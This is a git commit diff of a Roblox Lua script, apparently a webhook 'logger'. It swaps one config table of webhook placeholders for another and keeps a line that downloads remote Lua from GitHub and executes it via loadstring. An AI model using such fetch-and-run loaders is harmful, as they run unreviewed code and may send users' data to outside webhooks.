f831ccd190886fd6445c9b4f394ee23e96e725ad
MultiLogger <128045580+MultiLogger@users.noreply.github.com>
2023-04-21 11:48:27 -0400

    Update whole-script.lua

--- whole-script.lua
+++ whole-script.lua
@@ -1,11 +1,7 @@
-getgenv().MutliLogger = {
-    Webhook = {
-        ["URL"] = "YOUR_WEBHOOK_HERE"
-    },
-    Text = {
-        ["CustomText"] = "CUSTOM_TEXT_HERE"
-    }
+_G.Configuration = {
+    WEBHOOK = ( "YOUR_WEBHOOK_HERE" ),
+    TITLE = ( "YOUR_TITLE_HERE" ),
+    DESCRIPTION = ( "YOUR_DESC_HERE" ),
 }
-
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MultiLogger/MutliLogger-Roblox/main/logger.lua"))()
